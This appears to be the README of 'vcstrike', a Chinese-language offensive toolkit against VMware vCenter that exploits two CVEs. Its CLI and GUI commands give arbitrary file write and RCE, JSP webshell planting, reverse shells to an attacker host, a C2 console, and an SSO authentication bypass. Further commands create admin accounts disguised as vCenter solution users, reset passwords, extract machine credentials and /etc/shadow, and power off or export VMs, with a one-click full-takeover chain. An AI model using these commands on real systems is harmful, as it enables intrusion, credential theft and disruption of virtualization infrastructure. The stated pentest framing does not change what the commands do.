## 安装与自检

要求 Python 3.8+，无第三方依赖（GUI 需系统 tkinter，Windows/macOS
官方 Python 自带，Linux 需 `python3-tk` 包）。

```bash
python -m vcstrike selftest     # 离线自检：AES/BER/SRP 全绿方可使用
python vc-strike.py             # GUI（= python -m vcstrike gui）
python -m vcstrike --help       # CLI 帮助
```

## GUI 使用

七个页签，状态栏显示执行状态，底部日志面板可保存：

1. **① 目标与指纹**：添加/导入目标 → 批量指纹（仅探测）→ 导出 CSV；
   双击行设为全局当前目标。
2. **② CVE-2026-59310 利用**：参数区（syslog 端口/协议/标识/VAMI 回显端口/
   base64 封装开关）；非破坏写入验证；任意文件写（路径/向量/内容/报文预览）；
   RCE（带回显 / 仅植入）；反弹 shell 植入；WebShell 植入。
3. **③ CVE-2026-59309 利用**：端口/TLS/身份/安全层策略；
   SRP 机制探测；认证绕过；用户与管理员组枚举；创建 SSO 管理员；
   重置密码；LDAP 查询控制台（Base/范围/过滤器）。
4. **④ C2 / 反弹 Shell**：多端口监听、会话表（双击交互）、交互终端、
   上传/下载。
5. **⑤ 后渗透**：一键动作（系统信息/机器账户/SSO 域名/网络/服务/计划任务/
   入侵痕迹快扫）+ 自定义命令，输出经 VAMI 回显取回。
6. **⑥ 清理中心**：聚合本次会话全部落点 → 生成并复制清理命令。
7. **⑦ 检测与加固**：防御侧自查命令 / IOC / 缓解措施（可复制）。

## CLI 全命令参考

统一入口：`python -m vcstrike <command>` 或 `python vc-strike.py <command>`。
59310 系列子命令（check59310/write59310/exec59310/webshell/revshell/postex）
通用参数：`--port`（syslog 端口，默认 514）、`--proto {udp,tcp,tls}`；
59309 系列的 `--port` 是 LDAP 端口（389/636/2020），语义不同。

### scan — 批量指纹

```bash
python -m vcstrike scan 10.0.0.1,10.0.0.2 [--out result.csv] \
    [--proxy http://127.0.0.1:7897] [--timeout 6]
python -m vcstrike scan @targets.txt --out result.csv
```

### check59310 — 非破坏写入验证

```bash
python -m vcstrike check59310 10.0.0.1 [--port 514] [--proto udp] [--name xx]
```

写入 `/tmp/cve59310_check_<name>-syslog.log`；需在目标上 `ls` 确认
（UDP 无回包，这是 59310 最强的探测手段）。

### write59310 — 任意文件写

```bash
python -m vcstrike write59310 10.0.0.1 --path /opt/vmware/share/htdocs/pwned \
    [--content 'text' | --file local.txt] [--vector app|host]
```

### exec59310 — RCE

```bash
# 带回显（默认）：输出经 /opt/vmware/share/htdocs + VAMI :5480 HTTP 读回
python -m vcstrike exec59310 10.0.0.1 -c 'id; cat /etc/vmware-release' \
    [--vami-port 5480] [--wait 240] [--no-b64] [--proxy ...]

# 仅植入：输出落目标 /tmp/cve59310_<随机>.txt
python -m vcstrike exec59310 10.0.0.1 -c 'id' --mode plain
```

命令不能含换行；默认 base64 封装规避引号问题（`--no-b64` 关闭）。

### webshell — JSP WebShell 植入

```bash
python -m vcstrike webshell 10.0.0.1 [--name abc123]
# 结果: https://10.0.0.1/statsreport/abc123.jsp?c=id
# （&d=/tmp 可选，指定命令工作目录）
```

statsreport 可能要求认证 —— 配合 ③ 页创建的 SSO 管理员或已提取凭据。

### revshell — 反弹 shell（植入 + 交互监听）

```bash
python -m vcstrike revshell 10.0.0.1 --lhost 10.0.0.5 --lport 4444 \
    [--method bash|python]
```

植入后自动进入单端口交互（crond 约 60s 触发回连）。

### listen — C2 多会话控制台

见下节。

### check59309 — SRP 探测 / 绕过

```bash
python -m vcstrike check59309 10.0.0.1                 # 仅探测（匿名 rootDSE）
python -m vcstrike check59309 10.0.0.1 --bypass        # 完整绕过 + 只读验证
# 可选: --port 389|636|2020 --tls --identity administrator@vsphere.local
#       --policy auto|full|plain
```

返回 `Illegal value for 'A' (A mod N == 0)` ⇒ 目标已修复。

### ldap59309 — SSO 目录操作（绕过后）

```bash
python -m vcstrike ldap59309 10.0.0.1 enum-users
python -m vcstrike ldap59309 10.0.0.1 admins
python -m vcstrike ldap59309 10.0.0.1 add-admin --user pentest_x --pass 'Str0ng!Pass'
python -m vcstrike ldap59309 10.0.0.1 reset-pw --dn 'cn=administrator,cn=Users,dc=vsphere,dc=local' --pass 'NewPass1!'
python -m vcstrike ldap59309 10.0.0.1 search --filter '(cn=*)' --scope sub
# 公共: --port --tls --identity --policy --base（默认自动读 namingContexts）
```

### postex — 后渗透

```bash
python -m vcstrike postex 10.0.0.1 sysinfo        # 系统信息/版本
python -m vcstrike postex 10.0.0.1 machine-creds  # 提取 vmdir 机器账户
python -m vcstrike postex 10.0.0.1 sso-domain     # SSO 域名
python -m vcstrike postex 10.0.0.1 net            # 网络与监听端口
python -m vcstrike postex 10.0.0.1 cron           # 计划任务盘点
python -m vcstrike postex 10.0.0.1 vmware         # VMware 服务状态
python -m vcstrike postex 10.0.0.1 ioc            # 59310 入侵痕迹快扫
python -m vcstrike postex 10.0.0.1 cmd --cmdline 'cat /etc/shadow | head -5'
```

### chain — 一键打通（⑧ 页签同功能）

```bash
python -m vcstrike chain 10.0.0.1 [--user pentest_x] [--pass 'Str0ng!Pass'] \
    [--skip-59310 | --skip-59309] [--no-inventory] [--report r.md] \
    [--proto udp] [--port 514] [--vami-port 5480] [--wait 200] [--proxy ...]
```

自动流程：指纹 → 59310 RCE 提取机器账户与 SSO 域 → 目录接管
（机器账户 simple bind 首选，59309 SRP 绕过降级，身份自动从机器账户 DN
推导）→ 新建管理员并加入 Administrators → 新账户 bind 回验 + 组成员确认 →
（默认）用交付账户经 vCenter REST API（443，只读）做 vSphere 资产盘点
（`--no-inventory` 关闭）。
结束输出交付卡片（登录地址/账户/密码/路径/清理命令）；`--report r.md`
导出 Markdown 测试报告（阶段明细表 + 交付卡片）。
典型耗时 2-4 分钟（crond 分钟粒度）。交付即终点：不做 /ui 后续动作、
不留持久化。

交付账户自动存入**账号库**（exe 同目录 vc-strike-accounts.json，明文保管
请自行负责）——⑧/⑨ 页可一键带入复用，多机可共用同一账户；
③/⑧ 默认账户名伪装为 vCenter 解决方案用户（vpxd-extension-<8hex>）。

### mgmt — vSphere 资产盘点（独立）

```bash
python -m vcstrike mgmt 10.0.0.1 --user 'pentest_x@vsphere.local' --pass 'xxx'
```

对**已有合法 SSO 账户**的目标做只读清单采集（虚拟机/主机/数据存储/
集群/网络），走官方 REST API（443）。适用于交付账户落地后的按需盘点，
或验证手上账户的有效性。

### vops — vSphere 单台 VM 操作（⑨ 页签同功能）

**⑨ 页附加能力**：表头点击排序（名称/电源/vCPU/内存/VM-ID，再点反向）；
右键菜单（复制 VM-ID/名称、详情/磁盘/快照、电源操作、导出此 VM——电源与
导出仍走确认护栏）；账号库下拉一键带入交付账户。

```bash
python -m vcstrike vops 10.0.0.1 --user 'pentest_x@vsphere.local' --pass 'xxx' --action vms
python -m vcstrike vops 10.0.0.1 --user ... --pass ... --action detail    --vm vm-1234
python -m vcstrike vops 10.0.0.1 --user ... --pass ... --action snapshots --vm vm-1234
python -m vcstrike vops 10.0.0.1 --user ... --pass ... --action power-off --vm vm-1234
```

action：`vms`（清单）/ `detail` / `disks` / `snapshots`（只读）/
`power-on` / `power-off` / `suspend` / `reset`（写操作，交互下需输入
VM 标识确认）/ `export`（单台导出 OVA，需 `--out` 目录与本机 ovftool，
自动检测；多数据中心逐个尝试；全程审计）。边界：不做批量操作、
不做删除类动作——影响证明用只读清单 + 单台演示 + 导出即可。

## C2 会话控制台

```bash
python -m vcstrike listen --ports 4444,8443
```

```
c2> help
  sessions                列出会话
  listeners               查看监听端口
  use <id> / back         进入会话直通模式（原始 shell）；直通中 exit 返回 c2>
  exec <id> <cmd>         执行命令并回显
  upload <id> <local> <remote>    上传（md5 自动校验；路径含空格加引号）
  download <id> <remote> <local>  下载（base64 校验；大文件先 gzip）
  close <id>              关闭会话
  exit                    会话直通中返回 c2>；顶层退出控制台
```

注意：命令名（exec/upload/...）是**保留字**——会话直通模式下要在目标上执行
同名 shell 命令，请用 `exec <id> <cmd>`。会话输出为**原始流**（ANSI 颜色码已
剥离、换行归一化）：GUI 终端实时上屏；CLI `exec` 收集到静默后一次性返回，
长时间无输出的命令（sleep/dd 等）会被静默判定提前返回属正常现象。

- 会话来源：`revshell` 命令、② 页"植入 + 去监听"、任何指向监听端口的
  bash/python 反弹 shell。
- 断线**不自动重连**；重连 = 重新植入（本工具不做隐蔽持久化）。

## 典型流程

```
授权确认 → scan 指纹 → check59310 / check59309 确认攻击面
  ├→ 59310: exec59310 带回显取证 → webshell → revshell + listen (C2)
  │        → postex machine-creds（机器账户）→ 保存凭据
  ├→ 59309: check59309 --bypass → ldap59309 enum-users/admins
  │        → add-admin（影响证明）→ /ui 登录验证
  └→ ⑥ 清理中心 生成清理方案 → 目标复原 → 导出日志/报告归档
```

## FAQ

**Q：为什么 `check59310` 没有任何输出/报错？**
UDP 无回包。发送成功不代表漏洞存在，需在目标上 `ls` 确认标记文件；
也可改 `--proto tcp` 验证端口连通。

**Q：exec59310 一直超时？**
排查：目标 5480（VAMI）是否可达、是否已修复（9.0.2.0100+）、
crond 是否运行。回显依赖 VAMI 静态目录可读。

**Q：59309 绕过报"无法协商出本工具支持的安全层组合"？**
服务端强制/优先通告了本工具未实现的算法（需要 SHA-1/HMAC-SHA-1/AES 组合）。
若服务端未强制层可试 `--policy plain`（明文 LDAP）；否则暂不支持。

**Q：ldap59309 search 报"仅支持 (attr=value)"？**
过滤器解析器只实现了简单等值形式；复杂过滤器请配合 `--filter '(cn=a*)'`
这类单条件，或枚举后本地过滤。

**Q：反弹 shell 60 秒没回连？**
crond 每分钟调度，等 1-2 分钟；确认目标能反向路由到 LHost:LPort；
切换 `--method python`（载荷已 base64 封装，两种方式引号安全）；
监听机防火墙放行。

**Q：WebShell 访问 401/403？**
statsreport 走 SSO 认证 —— 先用 59309 建的管理员或机器账户登录获取
会话 Cookie，或改用其他落地路径。

**Q：工具里的 SHA-1/AES-OFB 会不会是隐患？**
它们是被测协议的固定构成（K=SHA1("")、安全层 AES-128-OFB+HMAC-SHA1），
不用于保护任何本方数据；详见 README"关于代码中的 SHA-1"一节。
